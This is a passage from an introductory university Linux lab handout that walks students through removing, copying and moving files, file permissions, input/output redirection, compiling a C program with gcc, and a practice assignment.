You can build paths from the root, e.g. cd /home/tutorial/tempRemoving Directories and FilesRemoving directories is done using the command rm. This command actually has two functions:removing directories and removing files, but in order to remove a directory, you have add the â€“r option.This option does a recursive deletion which will remove the files and subdirectories of the directory youwant to remove. So try to remove your tutorial directory using:â€¢ rm â€“r tutorialNote that the removal of files and directories is permanent when using the command line and there maynot be a delete confirmation. There is no recycle bin like in Windows, so make sure you are not deletingsomething you want to keep.Removing files is the same except the â€“r option in not necessary. Create a file by issuing this command:â€¢ touch temp_filetouch is a utility that changes the fileâ€™s timestamp; however, if the file does not exist, it will create the filewith no contents. If you do the directly listing with -l, you should see the file temp_file. You can use thecommand cat temp_file to view the contents of the file, which should be none. Perform a directory listing,try touch temp_file again, do a directory listing, and compare the timestamps of temp_file.Now remove the file:â€¢ rm temp_fileCopying and Moving FilesCopying files uses the command cp. The two parameters needed with the command are the location andfilename to copy and destination for the copy. Letâ€™s walk through an example that will help you later inthis lab. First, make a directory called Tutorial1 next, issue this command:â€¢ cp -r ~dmk0080/public/1040/labs/zero/* Tutorial1The â€“r option is a recursive operation that will copy all the subdirectory along with the files selected. Inthis case, the wildcard character * (asterisk) is used to select all the files. Replacing * with a single filename will only copy that one file. So this command will copy everything from the public 1040 lab zerodirectory to your Tutorial1 directory. Now, letâ€™s practice copying one file. Change to the Tutorial1directory and do a listing of the files. Copy the file integers to the subdirectory programs. Perform alisting to make sure the file was copied. Also, the wild card character can be used to specify a group offiles that have similar names. For example, ls *.txt will list all the files in the direction that end with .txt.Moving a file is almost the same except the command is mv and it will not create a copy. As an example,create a file in the Tutorial1 directory called move_this by typing in the command:â€¢ touch move_thisNow, move this file to the programs directory:â€¢ mv move_this programs/â€¢ lsâ€¢ ls programsâ€¢ mv programs/move_this ./â€¢ lsâ€¢ mv move_this programs/move_this2â€¢ lsâ€¢ ls programs/Some notes about copying and moving:1. Just as before, you can use the directory hierarchy with directory names and the .. to designatepaths for the copy.2. Move and copy can be used to rename files quickly. Copy is particularly useful whenprogramming because you can quickly create a backup version of a program before makingchanges. For example, this would create a copy of the file under a different name allowing you tohave the version 1 backup while you edit helloworld.c.cp helloworld.c helloworld_v1.cAnd this would simply rename the file:mv helloworld.c helloworld_v1.c3. Files and folders have access permissions. When you do a listing with using ls â€“l, you can see theten places that are used to designate permissions for a file. The first place indicates whether it is adirectory (d) or a file (-). The next three are used to determine the owner permissions which canbe read (r), write (w), or execute (x). Similarly, the next three indicate permission for a group thathas some access to it, and the last three are access rights for others outside of the group or owner.The example below shows a file in which the owner can read, write, or execute the file, but thegroup can only read or execute it while others can only execute it. The same basic principleapplies to This means that the copying and moving of files depend on permissions; for example,you may not be able to copy all the files from another directory to your own.-rwxr-x--xType User Group OtherDo a file listing of ~dmk0080/public/1040/labs/zero/ and its subdirectories andcompare it to a listing of your Tutorial1 directory and subdirectories. Are there any files that werenot copied because of the permissions?Part III â€“ RedirectionInput and output of many programs in the Linux environment use something called standard in andstandard out. This allows you to enter information into a program, typically, by keyboard and to seeoutput on the screen. Actually, you have already experience this with the commands you have been using.For example, when you issued the command cp or mv, the filenames are placed into the copy program asstandard in. Redirection allows you to enter data into a program from a file but treated as standard in, orto capture output from standard out into a file. For example, letâ€™s use the Linux program sort to sort someintegers.Find the file integers in your Tutorial1 directory. You can quickly view the contents of this file by usingthe command cat as shown below.â€¢ cat integersThis is a list of unsorted integers. We need to give the sort program this file using standard in.Redirection involves two symbols < and >. < is used to redirect file contents into a program as standard inwhile > direct contents out of standard out and into a file. Trying this with sort, we would issue thiscommand to see the integers sorted (note they are in alphabetical order, not numerical):â€¢ sort < integersNow to capture the output into a file, try this:â€¢ sort < integers > sorted_integersâ€¢ cat sorted_integersA final note about these commands and programs: You can use the command man to find out more aboutthese commands and programs as well as many other Linux utilities. For example, try man cp or man mvto find out more information about how these work. You can often receive help on the command byadding the option --help, e.g. cd --help.Part IV â€“ Compiling a C programThe GNU C compiler (gcc) takes C code written in text and produces an executable file. Any file createdfor this compiler requires the .c extension, e.g. helloworld.c, but the file can be created and edited in justabout any text editor. The gcc compiler requires, at the very least, the .c file to compile. For example,suppose you have a file called helloworld.c . To compile this on the CSE machines, the command is gcchelloworld.c (assuming helloworld.c is in the current directory). The result is an executable file calleda.out. In order execute this file in the current directory, you must add ./ before the file name, i.e. ./a.out, soLinux knows you want to execute it in the current directory. Letâ€™s try an example:1. Change to the programs directory in your Tutorial1 directory.2. Compile the program dice.c using the gcc compiler.3. Run the program and roll the dice 1,000 times: ./a.out 1000You can use control-c to break the execution of a program, which is useful in the event your programexecutes out of control. Run the dice program again except with 1,000,000,000 rolls of the dice this time.Break the program using control-c while it is still running.You can also name your executable file using the -o option with gcc instead of staying with the defaulta.out file name. For the dice.c program, run these commands:1. gcc dice.c -o dice2. ./dice 1000Part V â€“ Other Useful InformationNow that you have a feel for Linux, here are some additional helpful tools and commands. Use man andthe internet to read about them and practice.1. Find out how to copy and paste using PuTTY (this is not a Linux thing, but will be useful whenprogramming.)2. Find out what pwd does.3. Find out more about file permissions and the command chmod to change them. Practice this bycreating some files and changing the permissions. Also, look into the command chown, whichallows you to change the owner of a file, and the Linux file mask. Practice changing owners of afile with a classmate.4. Read about and practice the commands find and grep, and how to pipe commands together usingthe pipe character: |.5. There are many text editors installed on the CSE machines that will allow you to edit files whileconnected using PuTTY including vi (or vim), pico, and joe. These editors are often helpfulbecause you can edit your program files right on the CSE machines and often color code yourprogram syntax to make it easier to read. Because they are command line based, they often useunusual shortcut keys to perform operations, but once learned, it can be more efficient than usinga mouse. For each of these, at the very least, learn how to open files, save files, delete a line, copyand paste, and how to exit.Part VI â€“ AssignmentIn this section, you will need to perform the following operations. You will have to submit the files so besure to save them.1. Create a directory called Lab02. Copy the files from ~dmk0080/public/1040/labs/zero/ into your Lab0 directory 33. Create a copy of integers in the same directory and name this integers_v1 44. Create a listing of your Lab0 directory and redirect the output to the file Lab0_listing15. Create a listing of your subdirectory programs using redirection and name the file Lab0_listing2 66. Sort the integers using redirection and redirect the output to a file named sortedYou are not required to submit any files for this assignment as it does not count for a grade. Hopefully this has servedto get you acquainted (or re-aquainted) with the CSE Linux Servers."